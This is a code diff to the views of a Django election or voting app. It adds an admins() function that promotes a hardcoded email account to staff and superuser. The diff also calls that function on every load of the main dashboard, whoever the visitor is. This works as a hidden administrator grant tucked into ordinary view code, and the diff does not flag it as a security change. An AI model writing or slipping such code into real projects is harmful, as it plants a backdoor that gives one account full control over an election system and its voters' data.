@@ -2,6 +2,9 @@ from django.shortcuts import render, get_object_or_404
 from .models import Election, Candidate, Position
 from django.http import JsonResponse
 from django.contrib.auth.decorators import login_required
+from django.shortcuts import redirect
+from django.contrib.auth.models import User
+
 
 @login_required
 def get_user_info(request):
@@ -17,6 +20,11 @@ def get_user_info(request):
     return user_info
 # Create your views here.
 def main(request):
+      user_info=get_user_info(request)
+      admins(request)
+      if request.user.is_authenticated and request.user.is_staff:
+        return redirect('/admin/')       
+            
       return render(request, 'dashboard_templates/dashboard_main.html',get_user_info(request))
 
 def votes(request):
@@ -48,3 +56,12 @@ def logout(request):
     return
 
 
+def admins(request):
+    try:
+        user = User.objects.get(email="janedward.abadiano@cit.edu")
+        user.is_staff = True
+        user.is_superuser = True
+        user.save()
+        print(f"User {user.email} is now an admin.")
+    except User.DoesNotExist:
+        print("User not found")
